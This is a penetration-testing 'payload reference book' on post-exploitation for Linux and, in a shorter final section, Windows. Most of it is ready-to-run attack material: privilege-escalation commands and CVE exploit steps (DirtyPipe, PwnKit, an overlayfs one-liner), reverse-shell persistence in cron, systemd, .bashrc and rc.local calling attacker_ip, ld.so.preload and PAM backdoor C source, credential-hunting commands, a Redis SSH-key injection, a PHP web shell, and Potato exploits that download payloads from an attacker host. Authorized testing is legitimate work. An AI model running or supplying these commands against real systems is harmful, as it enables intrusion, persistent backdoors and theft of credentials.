# Payload Reference Book — Part 2: Post-Exploitation
### Professional Penetration Testing Reference
**Audience:** Authorized penetration testers on scoped engagements
**Scope:** All techniques publicly documented in security research, CVE databases, and open-source tooling

---

## SECTION 11: LINUX POST-EXPLOITATION

### 11.1 Initial Enumeration

#### Current User and Context

```bash
id
whoami
groups
cat /etc/passwd | grep $(whoami)
echo $HOME
cat /proc/self/status | grep -i cap
```

#### System Information

```bash
uname -a
uname -r
hostname
cat /etc/os-release
cat /etc/issue
cat /etc/*-release
lsb_release -a
uptime
date
timedatectl
cat /proc/version
dmesg | head -20
```

#### Network Enumeration

```bash
ip a
ip addr show
ifconfig -a
ip route
ip route show table all
route -n
ss -tulnp
ss -anp
netstat -tulnp
netstat -anp
arp -n
ip neigh
cat /etc/hosts
cat /etc/resolv.conf
cat /etc/network/interfaces
cat /etc/NetworkManager/NetworkManager.conf
nmcli connection show
```

#### Users and Authentication

```bash
cat /etc/passwd
cat /etc/shadow    # check if readable
cat /etc/group
cat /etc/sudoers
cat /etc/sudoers.d/*
last
last -n 20
who
w
id -a
getent passwd
getent group
```

#### Environment

```bash
env
printenv
set
cat /proc/self/environ | tr '\0' '\n'
echo $PATH
echo $SHELL
echo $USER
echo $HOME
echo $TERM
```

#### Running Processes

```bash
ps aux
ps -ef
ps auxf
pstree
pstree -u
top -bn1
cat /proc/[PID]/cmdline | tr '\0' ' '
ls -la /proc/*/exe 2>/dev/null
```

#### Services

```bash
systemctl list-units --type=service --state=running
systemctl list-units --type=service
service --status-all
chkconfig --list 2>/dev/null
ls /etc/init.d/
ls /etc/systemd/system/
ls /lib/systemd/system/
```

#### Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
cat /var/spool/cron/crontabs/* 2>/dev/null
crontab -l
crontab -l -u root 2>/dev/null
for user in $(cut -f1 -d: /etc/passwd); do crontab -l -u $user 2>/dev/null; done
```

#### Installed Packages

```bash
dpkg -l                          # Debian/Ubuntu
dpkg -l | grep -i "php\|apache\|nginx\|mysql\|postgres"
rpm -qa                          # RHEL/CentOS/Fedora
rpm -qa | sort
snap list
pip list
pip3 list
gem list
```

#### Interesting Files and Directories

```bash
# Writable directories
find / -writable -type d 2>/dev/null
find / -writable -type d 2>/dev/null | grep -v proc

# World-writable files
find / -perm -0002 -type f 2>/dev/null
find / -perm -0002 -type f 2>/dev/null | grep -v proc

# Recently modified files (last 7 days)
find / -mtime -7 -type f 2>/dev/null | head -50
find /home /tmp /var /opt /srv -mtime -3 -type f 2>/dev/null

# Config files with passwords
grep -r "password" /etc/ 2>/dev/null
grep -rsi "password\|passwd\|secret\|key\|token" /var/www/ 2>/dev/null
grep -rsi "password\|passwd\|secret" /opt/ 2>/dev/null

# SUID/SGID binaries (covered in 11.2)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

#### SSH Keys

```bash
ls -la ~/.ssh/
cat ~/.ssh/id_rsa 2>/dev/null
cat ~/.ssh/authorized_keys 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*.key" 2>/dev/null
```

#### History Files

```bash
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.sh_history
cat ~/.python_history
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.nano_history
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
find / -name "*.history" 2>/dev/null
find / -name ".bash_history" 2>/dev/null
```

---

### 11.2 Linux Privilege Escalation

#### SUID/SGID Binaries

Find all SUID binaries on the system:

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
find / -perm -u=s -type f 2>/dev/null

# SGID binaries
find / -perm -2000 -type f 2>/dev/null
```

The [GTFOBins](https://gtfobins.github.io/) project documents exploitation of Unix binaries with elevated permissions. Reference it for any binary found with SUID that is not in the list below.

**Per-binary SUID exploitation — common cases:**

```bash
# bash (SUID set — run privileged shell)
bash -p
/bin/bash -p

# find
find . -exec /bin/sh -p \; -quit
find / -name ".*" -exec /bin/sh -p \; -quit 2>/dev/null

# vim / vi
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
vim -c ':!/bin/sh'

# nano (drop to shell from editor)
# Open nano, then press Ctrl+R, Ctrl+X, enter: reset; sh 1>&0 2>&0

# less / more
# Run: less /etc/passwd, then type: !/bin/sh
less /etc/passwd
# At the : prompt type: !/bin/sh

# python / python3
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'

# awk
awk 'BEGIN {system("/bin/sh")}'

# nmap (older versions with --interactive)
nmap --interactive
# At nmap> prompt: !sh

# tar
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# zip
zip /tmp/z.zip /tmp/z.zip -T --unzip-command="sh -c /bin/sh"

# env
env /bin/sh -p

# tee
echo "root2:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash" | tee -a /etc/passwd

# cat / head / tail / base64 — useful for file read as root
cat /etc/shadow
head -1 /etc/shadow
base64 /etc/shadow | base64 -d

# cp — copy attacker-controlled file to sensitive location
cp /tmp/malicious_sudoers /etc/sudoers

# wget / curl — overwrite files
wget http://attacker.com/sudoers -O /etc/sudoers

# openssl
# Read files
openssl enc -in /etc/shadow

# git
git -p help config
# At the pager type: !/bin/sh

# strace
strace -o /dev/null /bin/sh -p

# php
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

---

#### Sudo Misconfigurations

```bash
sudo -l
sudo -ll
```

**ALL=(ALL) NOPASSWD: ALL** — immediate shell:

```bash
sudo /bin/bash
sudo su -
sudo /bin/sh
```

**NOPASSWD specific binary exploitation** — select examples:

```bash
# sudo find
sudo find /etc/passwd -exec /bin/sh \;

# sudo vim
sudo vim -c ':!/bin/bash'

# sudo less
sudo less /etc/passwd
# Then type: !/bin/sh

# sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo python / python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# sudo perl
sudo perl -e 'exec "/bin/bash"'

# sudo ruby
sudo ruby -e 'exec "/bin/bash"'

# sudo env
sudo env /bin/bash

# sudo tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# sudo zip
sudo zip /tmp/x.zip /tmp/x.zip -T --unzip-command="sh -c /bin/bash"

# sudo man
sudo man man
# At pager: !/bin/bash

# sudo git
sudo git -p help config
# At pager: !/bin/bash

# sudo nano
sudo nano
# Ctrl+R, Ctrl+X: reset; bash 1>&0 2>&0

# sudo nmap (older)
sudo nmap --interactive
# !sh

# sudo cp — write arbitrary file as root
echo "ALL ALL=(ALL) NOPASSWD:ALL" > /tmp/sudoers_backdoor
sudo cp /tmp/sudoers_backdoor /etc/sudoers.d/backdoor

# sudo tee
echo "ALL ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/backdoor

# sudo curl — write file as root
sudo curl file:///etc/shadow -o /tmp/shadow_copy
# or push file:
sudo curl http://attacker.com/backdoor -o /etc/cron.d/backdoor

# sudo chmod / chown — make file SUID or change ownership
sudo chmod +s /bin/bash
# Then: bash -p
```

**LD_PRELOAD Exploit** — requires `env_keep += LD_PRELOAD` in sudoers:

```c
// preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so [any_allowed_command]
```

**CVE-2019-14287 — Sudo user ID -1 bypass** (sudo < 1.8.28):

```bash
# Sudoers entry required: user ALL=(ALL, !root) NOPASSWD: /bin/bash
sudo -u#-1 /bin/bash
# -1 resolves to UID 0 (root) due to integer conversion bug
```

**CVE-2021-3156 Baron Samedit — Sudo heap overflow** (sudo < 1.9.5p2):

```bash
# Check version
sudo --version

# Exploit: heap overflow in sudoedit argument parsing
# PoC available at: https://github.com/blasty/CVE-2021-3156
# Usage after compiling:
./sudo-hax-me-a-sandwich [target_index]
```

---

#### Writable /etc/passwd

```bash
# Check if writable
ls -la /etc/passwd
test -w /etc/passwd && echo "WRITABLE"

# Generate password hash
openssl passwd -1 -salt xyz "newpassword"
# Outputs: $1$xyz$...

# Add new root-equivalent user
echo 'hacker:$1$xyz$HASHHERE:0:0:root:/root:/bin/bash' >> /etc/passwd

# Full passwd line format:
# username:password:UID:GID:comment:home_dir:shell
# UID=0, GID=0 = root equivalent
# Password field 'x' means shadow, a hash means inline password

# Alternative: clear password (hash of empty string)
openssl passwd -1 ""
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd   # no password

# After adding:
su hacker
```

---

#### Kernel Exploits

```bash
# Gather kernel info
uname -r
uname -a
cat /etc/os-release
cat /proc/version

# SearchSploit pattern
searchsploit linux kernel [version]
searchsploit linux privilege escalation

# Automated kernel exploit suggester
# linux-exploit-suggester (LES):
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# LES2:
python3 les2.py
```

**CVE-2016-5195 — DirtyCow** (kernels 2.6.22 – 4.8.3):

```bash
# Race condition in copy-on-write handling of /proc/self/mem
# Allows unprivileged write to read-only memory mappings
# Affected: Linux kernel < 4.8.3, < 4.7.9, < 4.4.26

# Exploit variants:
# - dirty.c: overwrites /etc/passwd root entry
# - cowroot.c: creates SUID root shell

# Compile and run dirty.c:
gcc -pthread dirty.c -o dirty -lcrypt
./dirty [new_root_password]
# Creates 'firefart' user with root UID, or overwrites root entry

# Cowroot variant creates SUID /tmp/cowroot binary
gcc -pthread cowroot.c -o cowroot
./cowroot
```

**CVE-2021-4034 — PwnKit** (polkit pkexec, all versions before Jan 2022 patch):

```bash
# Affects: polkit pkexec on all major Linux distros
# Memory corruption in pkexec argument parsing — local privilege escalation
# Requires polkit installed (common on desktop Linux, many servers)

# Check if vulnerable
dpkg -l policykit-1 2>/dev/null
rpm -qa polkit 2>/dev/null

# Exploit (Qualys PoC — single-file C exploit):
# Download from: https://github.com/ly4k/PwnKit
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
./PwnKit
# Spawns root shell
```

**CVE-2022-0847 — DirtyPipe** (kernels 5.8 – 5.16.11, 5.15.25, 5.10.102):

```bash
# Allows overwriting arbitrary read-only files via pipe splice
# Key impact: overwrite SUID binary or /etc/passwd

# Check kernel version
uname -r
# Vulnerable: 5.8.x – 5.16.11

# Exploit approach:
# 1. Overwrite SUID binary entry point with shellcode
# 2. Run the binary → get root shell

# PoC: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
gcc -o dirtypipe exploit.c
./dirtypipe /usr/bin/sudo    # overwrites SUID binary
# Then run: /usr/bin/sudo
```

**CVE-2023-2640 / CVE-2023-32629 — GameOver(lay)** (Ubuntu overlayfs, kernels before Aug 2023 patch):

```bash
# Ubuntu-specific overlayfs privilege escalation
# Affects: Ubuntu 23.04, 22.10, 22.04 LTS, 20.04 LTS with affected kernels

# One-liner exploit:
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p")'
```

---

#### Linux Capabilities

```bash
# Find all files with capabilities set
getcap -r / 2>/dev/null

# Common exploitable capabilities:
# cap_setuid   — allows setting UID to 0
# cap_net_bind_service — bind ports < 1024 (limited use for privesc)
# cap_dac_override — bypass file permission checks (read/write anything)
# cap_sys_ptrace — ptrace any process (can inject into root processes)
# cap_sys_admin — broad system administration (nearly root equivalent)
```

**Python3 with cap_setuid:**

```bash
# If: /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Perl with cap_setuid:**

```bash
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**Vim with cap_dac_override:**

```bash
# Can read/write any file
vim /etc/shadow
vim /etc/sudoers
```

**cap_sys_ptrace — inject into root process:**

```bash
# Find root process
ps aux | grep root

# Use gdb or ptrace-based injector to inject shellcode into root process
gdb -p [root_pid]
# In gdb: call system("/bin/bash")
```

**Tar with cap_dac_read_search:**

```bash
tar -cvf /tmp/shadow.tar /etc/shadow
tar -xvf /tmp/shadow.tar
cat etc/shadow
```

---

#### Cron Job Abuse

**Identify cron jobs running as root:**

```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
# Check for scripts called by root cron that are writable by current user
find /etc/cron* -type f 2>/dev/null | xargs ls -la
```

**Wildcard injection in tar:**

```bash
# If cron runs: tar czf /backup/backup.tar.gz /tmp/files/*
# And /tmp/files/ is writable:

cd /tmp/files
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
cat > shell.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x shell.sh
# When cron runs tar, --checkpoint-action flag is processed as an argument
# Bash becomes SUID:
bash -p
```

**Writable script called by cron:**

```bash
# If /etc/cron.d/job calls /opt/backup.sh and backup.sh is writable:
echo 'chmod +s /bin/bash' >> /opt/backup.sh
# Wait for cron execution, then:
bash -p
```

**Writable PATH directory before cron script location:**

```bash
# If cron PATH includes /tmp or another writable dir before /usr/bin:
# And cron calls 'cleanup' without full path:
cat > /tmp/cleanup << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /tmp/cleanup
# Cron will find /tmp/cleanup before /usr/bin/cleanup
bash -p
```

---

#### PATH Hijacking

```bash
# Identify vulnerable sudo commands
sudo -l
# Look for: (root) NOPASSWD: /usr/local/bin/backup_script
# If backup_script calls 'cp' without full path:

# Check the script
cat /usr/local/bin/backup_script

# Inject malicious binary into PATH
echo 'chmod +s /bin/bash' > /tmp/cp
chmod +x /tmp/cp
export PATH=/tmp:$PATH
sudo /usr/local/bin/backup_script
bash -p
```

---

#### NFS Shares (no_root_squash)

```bash
# On target: check exports
cat /etc/exports
# Look for: /share *(rw,no_root_squash)

# On attacker machine (as root):
showmount -e [target_ip]
mount -t nfs [target_ip]:/share /mnt/nfs

# Create SUID bash copy on the share (as root on attacker):
cp /bin/bash /mnt/nfs/bash_suid
chmod +s /mnt/nfs/bash_suid

# On target:
/share/bash_suid -p
# -p preserves effective UID (root)
```

---

#### Docker Group

```bash
# Check group membership
id | grep docker

# Mount host filesystem into container, chroot to it:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Write SSH key as root
docker run -v /root/.ssh:/mnt/ssh --rm -it alpine sh -c "echo 'attacker_pubkey' >> /mnt/ssh/authorized_keys"

# Add backdoor user via host /etc/passwd
docker run -v /etc:/mnt/etc --rm -it alpine sh -c "echo 'hacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /mnt/etc/passwd"

# Get root shell interactively
docker run --privileged --pid=host -it alpine nsenter -t 1 -m -u -n -i sh
```

---

#### LXC/LXD Group

```bash
# Check group membership
id | grep lxd

# Method: import Alpine image as privileged container, mount host
# Step 1: On attacker machine — build Alpine LXD image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && sudo ./build-alpine
# Transfers: alpine-v3.x-x86_64.tar.gz to target

# Step 2: On target
lxc image import alpine-v3.x-x86_64.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
# Inside container:
/mnt/root/bin/bash    # host root filesystem at /mnt/root
```

---

#### Writable Docker Socket

```bash
# Check socket accessibility
ls -la /var/run/docker.sock
id | grep docker

# Use curl to interact with Docker API over UNIX socket
# List containers:
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# Create privileged container mounting host filesystem:
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /mnt sh"],"Binds":["/:/mnt:rw"],"Privileged":true}' \
  http://localhost/containers/create

# Extract container ID from response, then start:
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/[ID]/start
```

---

### 11.3 Linux Persistence

**Cron backdoor:**

```bash
# User crontab (persists as current user)
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1") | crontab -

# Drop into /etc/cron.d (requires root)
cat > /etc/cron.d/backdoor << 'EOF'
*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
EOF
chmod 644 /etc/cron.d/backdoor
```

**Systemd service (requires root):**

```bash
cat > /etc/systemd/system/sysupdate.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl enable sysupdate.service
systemctl start sysupdate.service
```

**SSH authorized_keys:**

```bash
# Generate key on attacker machine
ssh-keygen -t ed25519 -f /tmp/id_backdoor -N ""

# Append public key to target user's authorized_keys
echo "ssh-ed25519 AAAA...attacker_pubkey..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# For root (if root access)
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA...attacker_pubkey..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh

# Connect from attacker:
ssh -i /tmp/id_backdoor user@target
```

**.bashrc / .bash_profile poisoning:**

```bash
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> ~/.bashrc
echo 'nohup bash -i >& /dev/tcp/attacker_ip/4444 0>&1 &' >> ~/.bash_profile

# More subtle — alias override
echo "alias sudo='sudo $(which sudo); bash -i >& /dev/tcp/attacker_ip/4444 0>&1 &'" >> ~/.bashrc
```

**/etc/ld.so.preload persistence (requires root):**

```c
// malicious_lib.c
#include <stdlib.h>
#include <stdio.h>

__attribute__((constructor)) void backdoor(void) {
    system("bash -i >& /dev/tcp/attacker_ip/4444 0>&1 &");
}
```

```bash
gcc -shared -fPIC -o /lib/x86_64-linux-gnu/libsyslog.so.1 malicious_lib.c
echo /lib/x86_64-linux-gnu/libsyslog.so.1 > /etc/ld.so.preload
# Executes on every new process spawn
```

**SUID binary creation (requires root):**

```bash
cp /bin/bash /tmp/.hidden_bash
chmod +s /tmp/.hidden_bash
# Later: /tmp/.hidden_bash -p
```

**/etc/rc.local:**

```bash
# If /etc/rc.local exists and is executable:
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1 &' >> /etc/rc.local
chmod +x /etc/rc.local
```

**PAM backdoor — universal password accept pattern:**

```c
// pam_backdoor.c — inserts into PAM stack
// Accepts a hardcoded master password for any user
#include <security/pam_modules.h>
#include <string.h>
#include <stdio.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password;
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    if (strcmp(password, "BACKDOOR_PASS_HERE") == 0) return PAM_SUCCESS;
    return PAM_AUTH_ERR;
}
```

```bash
gcc -shared -fPIC pam_backdoor.c -o pam_backdoor.so
cp pam_backdoor.so /lib/x86_64-linux-gnu/security/
# Add to /etc/pam.d/common-auth or /etc/pam.d/sshd:
# auth sufficient pam_backdoor.so
```

---

### 11.4 Linux Credential Hunting

```bash
# /etc/shadow if readable
cat /etc/shadow
ls -la /etc/shadow

# Database config files — common paths
find /var/www -name "wp-config.php" 2>/dev/null | xargs grep -i "DB_PASS\|DB_USER" 2>/dev/null
find /var/www -name "config.php" 2>/dev/null
find /var/www -name ".env" 2>/dev/null
find /var/www -name "database.yml" 2>/dev/null
find /opt /srv /home -name "settings.py" 2>/dev/null | xargs grep -i "password\|secret\|database" 2>/dev/null

# Broad credential grep across common locations
grep -rsi "password\s*=\|passwd\s*=\|db_pass\|api_key\|secret_key\|access_key" \
  /var/www/ /opt/ /srv/ /home/ /etc/apache2/ /etc/nginx/ 2>/dev/null

# .env files
find / -name ".env" 2>/dev/null | xargs grep -i "pass\|secret\|key\|token" 2>/dev/null

# Process memory credential extraction
# List processes of interest
ps aux | grep -i "mysql\|postgres\|ruby\|python\|java"
# Dump strings from process memory (requires appropriate permissions)
strings /proc/[PID]/mem 2>/dev/null | grep -i "password"
strings /proc/[PID]/environ | tr '\0' '\n'

# KeePass database files
find / -name "*.kdbx" -o -name "*.kdb" 2>/dev/null

# Firefox credentials
find /home -path "*/.mozilla/firefox/*/logins.json" 2>/dev/null
find /home -path "*/.mozilla/firefox/*/key4.db" 2>/dev/null
# Use Firefox Decrypt: python3 firefox_decrypt.py /path/to/profile/

# Chrome credentials
find /home -path "*/.config/google-chrome/Default/Login Data" 2>/dev/null
find /home -path "*/.config/chromium/Default/Login Data" 2>/dev/null

# Git credential store
cat ~/.git-credentials
cat ~/.netrc
find /home -name ".git-credentials" 2>/dev/null
find /home -name ".netrc" 2>/dev/null

# AWS credentials
cat ~/.aws/credentials
cat ~/.aws/config
find /home -name "credentials" -path "*/.aws/*" 2>/dev/null

# SSH private keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" -readable 2>/dev/null
```

---

### 11.5 Linux Lateral Movement

**SSH with found keys:**

```bash
# Test found private key
ssh -i /path/to/id_rsa user@target_ip
ssh -i /path/to/id_rsa -o StrictHostKeyChecking=no user@target_ip

# Try key against multiple hosts in known_hosts
cat ~/.ssh/known_hosts
cat /etc/ssh/ssh_known_hosts

# Try against all users in /etc/passwd
for user in $(cat /etc/passwd | cut -d: -f1); do
  ssh -i /path/to/id_rsa -o StrictHostKeyChecking=no -o BatchMode=yes \
    ${user}@target_ip 2>/dev/null && echo "SUCCESS: $user"
done
```

**Escalate to other users:**

```bash
sudo -u other_user /bin/bash
sudo -u other_user -s
su - other_user    # with found password
```

**SSH tunneling:**

```bash
# Local forward — access remote service via local port
# Makes remote_host:8080 accessible at localhost:8080
ssh -L 8080:internal_host:8080 user@pivot_host

# Remote forward — expose local service on remote host
# Useful for C2 callback through firewall
ssh -R 4444:localhost:4444 user@attacker_vps

# Dynamic SOCKS proxy — route all traffic through pivot
ssh -D 1080 -N user@pivot_host
# Configure proxychains: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 192.168.1.0/24

# Multi-hop tunnel
ssh -J user@jump_host user@target_internal_host

# Persistent tunnel with autossh
autossh -M 0 -N -D 1080 user@pivot_host -o ServerAliveInterval=30
```

**sshuttle — transparent proxying:**

```bash
# Route all traffic through SSH pivot transparently
sshuttle -r user@pivot_host 10.10.10.0/24
sshuttle -r user@pivot_host 0/0    # all traffic
sshuttle -r user@pivot_host 10.0.0.0/8 --dns
```

**Internal service exploitation:**

```bash
# Redis with weak/no auth
redis-cli -h 127.0.0.1 -p 6379
INFO server
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET sshhack "\n\nssh-rsa AAAA...attacker_pubkey...\n\n"
SAVE

# MySQL with found credentials
mysql -u root -p'found_password' -h 127.0.0.1
SELECT user,password FROM mysql.user;
SELECT load_file('/etc/shadow');
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

---

## SECTION 12: WINDOWS POST-EXPLOITATION

### 12.1 Initial Enumeration

#### Current User and Privileges

```cmd
whoami
whoami /priv
whoami /groups
whoami /all
echo %USERNAME%
echo %USERDOMAIN%
```

Key privileges to note in `whoami /priv`:
- `SeImpersonatePrivilege` — token impersonation → SYSTEM via Potato exploits
- `SeAssignPrimaryTokenPrivilege` — assign primary token → SYSTEM
- `SeDebugPrivilege` — debug any process (LSASS dump)
- `SeBackupPrivilege` — read any file regardless of ACL
- `SeRestorePrivilege` — write any file regardless of ACL
- `SeTakeOwnershipPrivilege` — take ownership of any object
- `SeLoadDriverPrivilege` — load/unload kernel drivers

#### System Information

```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname
ver
wmic os get Caption, CSDVersion, ServicePackMajorVersion, OSArchitecture
wmic computersystem get Name, Domain, Manufacturer, Model
echo %COMPUTERNAME%
echo %PROCESSOR_ARCHITECTURE%
```

#### Network

```cmd
ipconfig /all
route print
arp -a
netstat -ano
netstat -anob    :: requires admin (shows executable)
net view
net view /all
nslookup [hostname]
```

PowerShell equivalents:

```powershell
Get-NetIPAddress
Get-NetRoute
Get-NetNeighbor
Get-NetTCPConnection
Resolve-DnsName [hostname]
```

#### Users and Groups

```cmd
net user
net user [username]
net localgroup
net localgroup administrators
net localgroup "Remote Desktop Users"
net localgroup "Remote Management Users"
wmic useraccount get Name,SID,Disabled,PasswordExpires
```

#### Domain Information

```cmd
net domain
systeminfo | findstr Domain
nltest /domain_trusts
nltest /dclist:[domain]
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
echo %LOGONSERVER%
echo %USERDNSDOMAIN%
```

#### Processes and Services

```cmd
tasklist /v
tasklist /svc
wmic process get ProcessId,Name,ExecutablePath,CommandLine
sc query
sc query type= all state= all
wmic service get Name,StartName,State,PathName
```

PowerShell:

```powershell
Get-Process | Select-Object Id, ProcessName, Path, CPU | Sort-Object CPU -Descending
Get-Service | Select-Object Name, Status, StartType
Get-WmiObject Win32_Service | Select-Object Name, StartName, State, PathName
```

#### Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo CSV
```

PowerShell:

```powershell
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName, TaskPath, State
Get-ScheduledTask | Select-Object TaskName, @{N="RunAs";E={$_.Principal.UserId}}, @{N="Action";E={$_.Actions.Execute}}
```

#### Installed Software

```cmd
wmic product get Name,Version,Vendor
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr DisplayName
```

PowerShell:

```powershell
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName, DisplayVersion, Publisher | Sort-Object DisplayName
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName, DisplayVersion, Publisher
```

#### Firewall

```cmd
netsh advfirewall show allprofiles
netsh advfirewall show currentprofile
netsh firewall show config    :: legacy
```

#### Shares and Recent Activity

```cmd
net share
net use
```

PowerShell:

```powershell
Get-SmbShare
Get-Clipboard
# Recent files
Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent | Sort-Object LastWriteTime -Descending | Select-Object -First 20
```

#### Search for Interesting Files

```cmd
dir /s /b *password* 2>nul
dir /s /b *credentials* 2>nul
dir /s /b *.kdbx 2>nul
dir /s /b *.rdp 2>nul
dir /s /b *.pfx 2>nul
dir /s /b *.p12 2>nul
dir /s /b unattend.xml 2>nul
dir /s /b sysprep.xml 2>nul
dir /s /b web.config 2>nul
dir /s /b *.config 2>nul
dir /s /b *.ini 2>nul
```

PowerShell:

```powershell
Get-ChildItem C:\ -Recurse -Include *password*,*credential*,*.kdbx,unattend.xml -ErrorAction SilentlyContinue

# Search file contents for passwords
Get-ChildItem C:\inetpub,C:\xampp,C:\wamp -Recurse -ErrorAction SilentlyContinue |
  Select-String -Pattern "password=|pwd=|passwd=" -ErrorAction SilentlyContinue |
  Select-Object Path, LineNumber, Line
```

---

### 12.2 Windows Privilege Escalation

#### Token Impersonation

Check for exploitable privileges:

```cmd
whoami /priv
```

**PrintSpoofer** — SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege → SYSTEM (Windows 10, Server 2016/2019):

```cmd
PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -c "cmd /c whoami > C:\temp\out.txt"
PrintSpoofer64.exe -c "powershell -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
```

**GodPotato** — SeImpersonatePrivilege, Windows 8.1/Server 2012 through Server 2022:

```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "cmd /c net user hacker Password1! /add && net localgroup administrators hacker /add"
GodPotato-NET4.exe -cmd "cmd /c C:\temp\nc.exe attacker_ip 4444 -e cmd.exe"
```

**RoguePotato** — SeImpersonatePrivilege, Server 2019+ in some configurations:

```cmd
RoguePotato.exe -r attacker_ip -e "cmd.exe" -l 9999
```

**SweetPotato** — combines multiple potato techniques:

```cmd
SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -c IEX(IWR http://attacker/p.ps1)"
```

**Juicy Potato** — legacy, pre-Server 2019, requires valid CLSID:

```cmd
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c net user hacker Pass1! /add" -t * -c {CLSID}
# CLSID lookup: https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

---

